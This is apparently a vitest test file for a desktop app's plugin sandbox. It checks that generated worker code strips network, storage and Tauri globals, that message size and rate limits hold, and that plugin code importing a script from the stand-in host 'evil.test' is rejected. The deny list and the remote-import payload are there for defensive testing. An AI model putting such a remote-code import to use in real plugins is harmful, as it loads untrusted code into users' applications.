import { describe, expect, it } from 'vitest';
import { SANDBOX_POLICY, SandboxMessageBudget, workerSource } from './runtime';
import type { PluginManifest } from '../manifest';

const manifest: PluginManifest = { id: 'dev.example.local', name: 'Local', version: '1.0.0', type: 'ui', moosVersion: '^0.1.0', entry: 'main.js', slots: ['composer.trailing'], permissions: ['ui:slots'] };

describe('plugin sandbox runtime boundary', () => {
  it('builds a dedicated worker that removes host, network and persistence globals', () => {
    expect(SANDBOX_POLICY).toContain('no DOM/Tauri');
    const source = workerSource('secret-session', manifest, "moos.registerSlot('composer.trailing',()=>({type:'text',text:'ok'}))");
    expect(() => new Function(source)).not.toThrow();
    expect(source).toContain('message.kind==="health"');
    for (const denied of ['fetch', 'WebSocket', 'Worker', 'BroadcastChannel', 'indexedDB', 'postMessage', '__TAURI__', '__TAURI_INTERNALS__']) expect(source).toContain(`"${denied}"`);
    expect(() => workerSource('token', manifest, "import('https://evil.test/x.js')")).toThrow(/imports/i);
  });

  it('rejects oversized messages and a per-second flood', () => {
    expect(new SandboxMessageBudget().accept(64 * 1024 + 1, 1)).toBe(false);
    const budget = new SandboxMessageBudget();
    for (let index = 0; index < 200; index++) expect(budget.accept(10, 100)).toBe(true);
    expect(budget.accept(10, 100)).toBe(false);
    expect(budget.accept(10, 1200)).toBe(true);
  });
});
